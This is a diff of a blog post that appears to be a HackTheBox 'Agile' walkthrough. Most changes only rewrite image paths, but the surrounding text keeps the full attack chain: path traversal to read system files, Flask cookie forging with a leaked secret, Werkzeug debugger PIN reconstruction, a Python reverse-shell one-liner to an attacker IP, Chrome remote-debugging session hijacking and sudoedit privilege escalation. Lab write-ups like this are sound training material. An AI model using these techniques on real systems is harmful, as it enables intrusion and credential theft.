@@ -352,77 +352,101 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>We see superpass as a super password manager:</p>
-<p><img src="/SuperpassHomepage.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/SuperpassHomepage.png"
+	width="1270"
+	height="596"
+	srcset="/post/hackthebox-agile/Images/SuperpassHomepage_hu826a0ec889d5437b4bd851768303d960_424550_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/SuperpassHomepage_hu826a0ec889d5437b4bd851768303d960_424550_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Home Page"
 	
 	
+		class="gallery-image" 
+		data-flex-grow="213"
+		data-flex-basis="511px"
+	
 ></p>
 <p>Trying to login with generic credentials does not succeed, but we are able to register an account, <code>asdf:asdf</code></p>
-<p><img src="/Register.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/Register.png"
+	width="490"
+	height="410"
+	srcset="/post/hackthebox-agile/Images/Register_hu65f5ae6f9219bfa52dc760b5f78f2b89_19649_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/Register_hu65f5ae6f9219bfa52dc760b5f78f2b89_19649_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="asdf registration"
 	
 	
+		class="gallery-image" 
+		data-flex-grow="119"
+		data-flex-basis="286px"
+	
 ></p>
 <p>We see a vault where we can begin to generate passwords, and label them with sites/usernames.</p>
-<p><img src="/PassGen.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/PassGen.png"
+	width="935"
+	height="314"
+	srcset="/post/hackthebox-agile/Images/PassGen_hue81dee2fe23cfacc4f84c30424fb7100_49052_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/PassGen_hue81dee2fe23cfacc4f84c30424fb7100_49052_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Add a password"
 	
 	
+		class="gallery-image" 
+		data-flex-grow="297"
+		data-flex-basis="714px"
+	
 ></p>
 <p>The export feature is interesting, as depending on how the query is designed, we may be able to alter our request and receive unintended responses. Using burpsuite, we can intercept our traffic and get a better idea on how we are interacting with the web service.</p>
 <p>We can see upon clicking <code>Export</code> we are sent to the url <a class="link" href="http://superpass.htb/vault/export"  target="_blank" rel="noopener"
     >http://superpass.htb/vault/export</a> on a GET request:</p>
-<p><img src="/NoPass.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/NoPass.png"
+	width="1029"
+	height="421"
+	srcset="/post/hackthebox-agile/Images/NoPass_hu5c52c7faa54f44e7e7766115fd90505e_80632_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/NoPass_hu5c52c7faa54f44e7e7766115fd90505e_80632_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="No password error"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="244"
+		data-flex-basis="586px"
 	
 ></p>
 <p>An interesting finding at this point, we see that <code>superpass.htb</code> server
 is described as nginx. However, this /vault/export pathway is not a .php file, as visiting superpass.htb/vault/export.php results in <code>404 Not Found</code>. We will eventually learn that this service is running from Flask, although it wasn&rsquo;t apparent at first glance if you didn&rsquo;t run into the common SQLAlchemy error.</p>
 <p>Since we didn&rsquo;t click the save icon when generating out password, it seems like our database is still empty.</p>
 <p>Once we add a password, we can see the call redirects to a custom url, <code>download?fn=asdf_export_49adcafaf8.csv</code>. We might be able to reverse the process that generates the names, but regardless we will need more information such as usernames before we could take advantage:</p>
-<p><img src="/Export.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/Export.png"
+	width="1030"
+	height="450"
+	srcset="/post/hackthebox-agile/Images/Export_hu86a3374812d5093230f260dc0f8fcb56_105454_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/Export_hu86a3374812d5093230f260dc0f8fcb56_105454_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Burpsuite Export"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="228"
+		data-flex-basis="549px"
 	
 ></p>
 <h3 id="arbitrary-file-read-in-download">Arbitrary file read in <code>/download</code></h3>
 <p>In a simpler approach, we can check if we are able to reference any file by specifying the path:
 <code>http://superpass.htb/download?fn=../../../../../../../etc/passwd</code></p>
 <p>Upon visiting this link, we receive a download prompt for our file. We can proceed to visit each url we want to check then open the downloaded file individually, or we can see the output directly through burpsuite:</p>
-<p><img src="/etc_passwd.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/etc_passwd.png"
+	width="1026"
+	height="499"
+	srcset="/post/hackthebox-agile/Images/etc_passwd_huaf9b3493daf5d0c8b1cfb6bd215835c0_135743_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/etc_passwd_huaf9b3493daf5d0c8b1cfb6bd215835c0_135743_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="/etc/passwd"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="205"
+		data-flex-basis="493px"
 	
 ></p>
 <p>In this file we can see 4 user accounts:</p>
@@ -441,14 +465,18 @@ is described as nginx. However, this /vault/export pathway is not a .php file, a
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>Viewing a non-existent file we can see interesting information through the given error. The service is utilizing Werkzeug Debugger (python Flask), the download function is pulling from <code>/tmp/</code> and the flask SECRET is also displayed:</p>
-<p><img src="/Error.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/Error.png"
+	width="849"
+	height="611"
+	srcset="/post/hackthebox-agile/Images/Error_hu43312189c7bc801fbab5e7fc1db40361_135651_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/Error_hu43312189c7bc801fbab5e7fc1db40361_135651_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Flask Error"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="138"
+		data-flex-basis="333px"
 	
 >
 Note, the SECRET is only visible when looking at the source page, or through raw output such as Burpsuite or <code>curl</code>:</p>
@@ -471,14 +499,18 @@ Note, the SECRET is only visible when looking at the source page, or through raw
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>The last section in the traceback is particularly important, as it gives a full pathway to our source files so that we might view them exploiting this <code>download</code> vulnerability.</p>
-<p><img src="/Vault_views.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/Vault_views.png"
+	width="1040"
+	height="635"
+	srcset="/post/hackthebox-agile/Images/Vault_views_hu238080330f1e558120f4298b662f68cb_137413_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/Vault_views_hu238080330f1e558120f4298b662f68cb_137413_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Vault Views"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="393px"
 	
 ></p>
 <p>From here, we can enumerate all or most of the python source files by watching the imports. For example, <code>from superpass.services.utility_service import get_random</code> tells us that there is a python file accessible at <code>/app/app/superpass/services/utility_service.py</code>. We can also determine that the main <code>app.py</code> file will be located at <code>/app/app/superpass/app.py</code>, based on where the import path is starting.</p>
@@ -560,14 +592,18 @@ I find my answer in
 </div>
 </div><p>Visiting a <a class="link" href="https://www.kirsle.net/wizards/flask-session.cgi"  target="_blank" rel="noopener"
     >Flask cookie decoder online tool</a>, we can decode without issue into something more readable:</p>
-<p><img src="/DecodeCookie.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/DecodeCookie.png"
+	width="1389"
+	height="540"
+	srcset="/post/hackthebox-agile/Images/DecodeCookie_hu7d6aaa1ef0792b2927bc3687d3b5ef4e_135451_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/DecodeCookie_hu7d6aaa1ef0792b2927bc3687d3b5ef4e_135451_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Flask Decoded"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="257"
+		data-flex-basis="617px"
 	
 ></p>
 <div class="highlight"><div class="chroma">
@@ -599,13 +635,13 @@ I find my answer in
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">┌──(kali㉿kali)-</span><span class="p">[</span><span class="err">~/Documents/Agile</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="err">└─$</span> <span class="err">cat</span> <span class="err">tosign.txt</span>                                      
-</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="err">&#39;_fresh&#39;:</span> <span class="err">True,</span> <span class="err">&#39;_id&#39;:</span> <span class="err">&#39;733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96&#39;,</span> <span class="err">&#39;_user_id&#39;:</span> <span class="err">&#39;0&#39;</span><span class="p">}</span>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Agile]
+</span></span><span class="line"><span class="cl">└─$ cat tosign.txt                                      
+</span></span><span class="line"><span class="cl">{&#39;_fresh&#39;: True, &#39;_id&#39;: &#39;733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96&#39;, &#39;_user_id&#39;: &#39;0&#39;}
 </span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                            
-</span></span><span class="line"><span class="cl"><span class="err">┌──(kali㉿kali)-</span><span class="p">[</span><span class="err">~/Documents/Agile</span><span class="p">]</span>
-</span></span><span class="line"><span class="cl"><span class="err">└─$</span> <span class="err">flask-unsign</span> <span class="err">-s</span> <span class="err">-S</span> <span class="err">&#39;tDxE</span><span class="mi">1</span><span class="err">kBphctDjlZ</span><span class="mi">1</span><span class="err">DvYf&#39;</span> <span class="err">--cookie</span> <span class="err">tosign.txt</span>
-</span></span><span class="line"><span class="cl"><span class="err">InRvc</span><span class="mi">2</span><span class="err">lnbi</span><span class="mi">50</span><span class="err">eHQi.ZMqw</span><span class="mi">8</span><span class="err">Q.zmr</span><span class="mi">3</span><span class="err">nM</span><span class="mi">3</span><span class="err">FEIqwYykzEMSZnSCCPsk</span>
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Agile]
+</span></span><span class="line"><span class="cl">└─$ flask-unsign -s -S &#39;tDxE1kBphctDjlZ1DvYf&#39; --cookie tosign.txt
+</span></span><span class="line"><span class="cl">InRvc2lnbi50eHQi.ZMqw8Q.zmr3nM3FEIqwYykzEMSZnSCCPsk
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>Unfortunately, trying to use this cookie resulted in a failure. Presumably, the <code>_id</code> hash no longer correlates to <code>_user_id</code> value and the cookie session becomes invalid.</p>
@@ -633,25 +669,33 @@ I find my answer in
 <h2 id="foothold">Foothold</h2>
 <h3 id="recreating-werkzeugs-debugger-pin">Recreating Werkzeug&rsquo;s Debugger PIN</h3>
 <p>Eventually I turn myself to the system&rsquo;s active <code>debugger</code> mode. We noticed that this is turned on, since when we requested to download a file that didn&rsquo;t exist, we saw detailed traceback. From these error pages, we can open an interactive terminal by clicking on the console icon available when hovering over one of the code lines:</p>
-<p><img src="/ConsoleOption.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/ConsoleOption.png"
+	width="981"
+	height="557"
+	srcset="/post/hackthebox-agile/Images/ConsoleOption_huec404b7928046aa9cdf0fa39e9d2f401_130160_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/ConsoleOption_huec404b7928046aa9cdf0fa39e9d2f401_130160_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Console Option Available"
 	
 	
+		class="gallery-image" 
+		data-flex-grow="176"
+		data-flex-basis="422px"
+	
 ></p>
 <p>However, in order to prevent any random user from executing shell commands, a customized PIN is generated when the web server is launched. This is PIN is intended to be accessible only to the operators on the machine. The PIN is provided to console output, not saved in any guessable location.</p>
-<p><img src="/PIN_Ask.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/PIN_Ask.png"
+	width="453"
+	height="243"
+	srcset="/post/hackthebox-agile/Images/PIN_Ask_hud27b33b5378e3711ea7139b0ade81bfb_24639_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/PIN_Ask_hud27b33b5378e3711ea7139b0ade81bfb_24639_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="PIN requirement"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="447px"
 	
 ></p>
 <p>There is a <a class="link" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug"  target="_blank" rel="noopener"
@@ -697,14 +741,18 @@ I find my answer in
 Private Bits:</li>
 <li>When accessing <code>/sys/class/net/eth0/address</code>, we get id 00:50:56:b9:ce:53:</li>
 </ul>
-<p><img src="/Address.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/Address.png"
+	width="1008"
+	height="407"
+	srcset="/post/hackthebox-agile/Images/Address_huebf88bfd079d725e8013e4beab88de78_87475_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/Address_huebf88bfd079d725e8013e4beab88de78_87475_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="eth0 address"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="247"
+		data-flex-basis="594px"
 	
 ></p>
 <p>To convert into the private bit variable, we utilize python to print:</p>
@@ -721,38 +769,50 @@ Private Bits:</li>
 </div><ul>
 <li>Machine ID is a combination of <code>/etc/machine-id</code> and the last section of <code>/proc/self/cgroup</code>. Visiting <code>/etc/machine-id</code>:</li>
 </ul>
-<p><img src="/Machine.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/Machine.png"
+	width="1025"
+	height="401"
+	srcset="/post/hackthebox-agile/Images/Machine_hu53c11c5f124719d3d0c46fc67532da17_87697_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/Machine_hu53c11c5f124719d3d0c46fc67532da17_87697_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Machine ID"
 	
 	
+		class="gallery-image" 
+		data-flex-grow="255"
+		data-flex-basis="613px"
+	
 ></p>
 <p>Visiting <code>/proc/self/cgroup</code>:</p>
-<p><img src="/cgroup.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/cgroup.png"
+	width="1033"
+	height="404"
+	srcset="/post/hackthebox-agile/Images/cgroup_huba6577155503344ccb218ade7a6ff7e2_88123_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/cgroup_huba6577155503344ccb218ade7a6ff7e2_88123_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="cgroup"
 	
 	
+		class="gallery-image" 
+		data-flex-grow="255"
+		data-flex-basis="613px"
+	
 ></p>
 <p>The combined bit is <code>ed5b159560f54721827644bc9b220d00superpass.service</code></p>
 <h3 id="remote-code-execution-as-www-data">Remote Code Execution as <code>www-data</code></h3>
 <p>Now with a debug PIN correctly generated, we can finally access the debugging console by clicking the interactive icon on any code in the error:</p>
-<p><img src="/consoleready.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/consoleready.png"
+	width="497"
+	height="123"
+	srcset="/post/hackthebox-agile/Images/consoleready_hu4d54c3d283ece5b4e49068b80c43de4b_17165_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/consoleready_hu4d54c3d283ece5b4e49068b80c43de4b_17165_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="debug active"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="404"
+		data-flex-basis="969px"
 	
 ></p>
 <p><code>import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.133&quot;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)</code></p>
@@ -801,14 +861,14 @@ Private Bits:</li>
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(venv) www-data@agile:/app/app$ ^Z
-</span></span><span class="line"><span class="cl">zsh: suspended  nc -nvlp 8888
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>venv<span class="o">)</span> www-data@agile:/app/app$ ^Z
+</span></span><span class="line"><span class="cl">zsh: suspended  nc -nvlp <span class="m">8888</span>
 </span></span><span class="line"><span class="cl">                                                                                                                                                         
-</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Agile]
-</span></span><span class="line"><span class="cl">└─$ stty raw -echo; fg 
-</span></span><span class="line"><span class="cl">[1]  + continued  nc -nvlp 8888
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Agile<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span> 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + continued  nc -nvlp <span class="m">8888</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">(venv) www-data@agile:/app/app$
+</span></span><span class="line"><span class="cl"><span class="o">(</span>venv<span class="o">)</span> www-data@agile:/app/app$
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="lateral-movement">Lateral Movement</h2>
@@ -979,14 +1039,18 @@ Private Bits:</li>
 </div><p>We have finally reached the <code>user.txt</code>.</p>
 <h3 id="hijacking-a-google-chrome-session-through-remote-debugging-port">Hijacking a google chrome session through remote-debugging port</h3>
 <p>Manual enumeration did not yield anything interesting to me. However, executing <code>linpeas</code> showed me a potential route to privilege escalation i was unaware of.</p>
-<p><img src="/RunnerDebugPort.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/RunnerDebugPort.png"
+	width="1312"
+	height="153"
+	srcset="/post/hackthebox-agile/Images/RunnerDebugPort_hu8d0e819b355fb1d863e2570ebfb92ab5_112718_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/RunnerDebugPort_hu8d0e819b355fb1d863e2570ebfb92ab5_112718_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Chrome session with remote debugging port"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="857"
+		data-flex-basis="2058px"
 	
 ></p>
 <p>There is a process of google chrome running, and special attention is drawn to the fact that the <code>--remote-debugging-port</code> flag is set. It appears that we might be able to hijack this web session, and explore the capabilities of what <code>runner</code> can access in this webpage. First, we need a way for our local browser to reach the box&rsquo;s port 41829. This is not directly accessible from our machine, so we must apply port forwarding. Chisel is a popular option, but since ssh exists I just utilize this approach</p>
@@ -999,58 +1063,78 @@ Private Bits:</li>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>To enter the port forwarding page in Google Chrome, in the url segment we type <code>chrome://inspect/#devices</code>. Next, we must configure our ports to the right of &ldquo;Discover network targets&rdquo;</p>
-<p><img src="/ChromeConfig1.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/ChromeConfig1.png"
+	width="935"
+	height="375"
+	srcset="/post/hackthebox-agile/Images/ChromeConfig1_hu9342b4eb6d41174d4a1e6604659161c7_52690_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/ChromeConfig1_hu9342b4eb6d41174d4a1e6604659161c7_52690_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Port Forwarding Page"
 	
 	
+		class="gallery-image" 
+		data-flex-grow="249"
+		data-flex-basis="598px"
+	
 ></p>
 <p>Set the address as localhost:1080, matching the listening port listed in our ssh command. This traffic will be forwarded to Agile box&rsquo;s port 41829.</p>
-<p><img src="/ChromeConfig2.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/ChromeConfig2.png"
+	width="301"
+	height="338"
+	srcset="/post/hackthebox-agile/Images/ChromeConfig2_hu08e987191379c2d1f1788e8fc8d49751_17566_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/ChromeConfig2_hu08e987191379c2d1f1788e8fc8d49751_17566_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Setting the address"
 	
 	
+		class="gallery-image" 
+		data-flex-grow="89"
+		data-flex-basis="213px"
+	
 ></p>
 <p>Now we can see a remote target. Notice the address is at <code>http://test.superpass.htb</code>. This seems to be a local-only version of the service, potentially with different password information than the live version we interacted with previously.</p>
-<p><img src="/RemoteTarget.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/RemoteTarget.png"
+	width="716"
+	height="339"
+	srcset="/post/hackthebox-agile/Images/RemoteTarget_hudaab9515eefba0e485e91f1bcd6cb1ef_46967_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/RemoteTarget_hudaab9515eefba0e485e91f1bcd6cb1ef_46967_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Target is now visible and accessible"
 	
 	
+		class="gallery-image" 
+		data-flex-grow="211"
+		data-flex-basis="506px"
+	
 ></p>
 <p>Selecting <code>inspect</code> will open a new DevTools tab, where we can interact with the chrome session.</p>
-<p><img src="/SuperpassTestSession.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/SuperpassTestSession.png"
+	width="1094"
+	height="633"
+	srcset="/post/hackthebox-agile/Images/SuperpassTestSession_huf9110bd3a5f74d4765688e0792764833_314688_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/SuperpassTestSession_huf9110bd3a5f74d4765688e0792764833_314688_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Interactive Chrome Session in test.superpass.htb"
 	
 	
+		class="gallery-image" 
+		data-flex-grow="172"
+		data-flex-basis="414px"
+	
 ></p>
 <p>Selecting the Vault, we see new passwords, this time for <code>edwards</code>. This was also a user account name on the machine.</p>
-<p><img src="/EdCred.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/EdCred.png"
+	width="1114"
+	height="432"
+	srcset="/post/hackthebox-agile/Images/EdCred_hu2c0b46aa59adbdfc78f3dfa3c6af2101_98147_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/EdCred_hu2c0b46aa59adbdfc78f3dfa3c6af2101_98147_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Ed&rsquo;s Creds"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="257"
+		data-flex-basis="618px"
 	
 ></p>
 <p>Using the inspect tools to the side of our web session, we can easily grab the raw text to copy. For this kind of password it is much better, so that we do not mistype when copying by hand.</p>
@@ -1112,14 +1196,18 @@ Private Bits:</li>
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">edwards@agile:/home/corum$ sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p><img src="/EdCred2.png"
-	
-	
-	
+</div><p><img src="/post/hackthebox-agile/Images/EdCred2.png"
+	width="597"
+	height="93"
+	srcset="/post/hackthebox-agile/Images/EdCred2_hueb15812d0958841002e0eb68c1cf2cc5_19053_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/EdCred2_hueb15812d0958841002e0eb68c1cf2cc5_19053_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Ed&rsquo;s Creds 2"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="641"
+		data-flex-basis="1540px"
 	
 ></p>
 <p>We see in a nano editor some more credentials for edwards.</p>
@@ -1260,25 +1348,33 @@ Setting up our environment variable:</p>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>When we execute we are not editing <code>creds.txt</code>. Instead, we see <code>/app/venv/bin/activate</code></p>
-<p><img src="/ativate.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/ativate.png"
+	width="941"
+	height="309"
+	srcset="/post/hackthebox-agile/Images/ativate_hu911b984b658346a7cede6675a6cc70a1_71575_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/ativate_hu911b984b658346a7cede6675a6cc70a1_71575_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="/app/venv/bin/activate in vim"
 	
 	
+		class="gallery-image" 
+		data-flex-grow="304"
+		data-flex-basis="730px"
+	
 ></p>
 <p>To ensure our payload runs at the start of this script, I insert the command before the commented lines:</p>
-<p><img src="/Payload_added.png"
-	
-	
-	
+<p><img src="/post/hackthebox-agile/Images/Payload_added.png"
+	width="730"
+	height="172"
+	srcset="/post/hackthebox-agile/Images/Payload_added_hua0f82bf1573ddbd688a680e9ee0352bb_35819_480x0_resize_box_3.png 480w, /post/hackthebox-agile/Images/Payload_added_hua0f82bf1573ddbd688a680e9ee0352bb_35819_1024x0_resize_box_3.png 1024w"
 	loading="lazy"
 	
 		alt="Malicious Payload"
 	
+	
+		class="gallery-image" 
+		data-flex-grow="424"
+		data-flex-basis="1018px"
 	
 ></p>
 <p>Now after waiting a few seconds, the connection reaches my kali machine:</p>
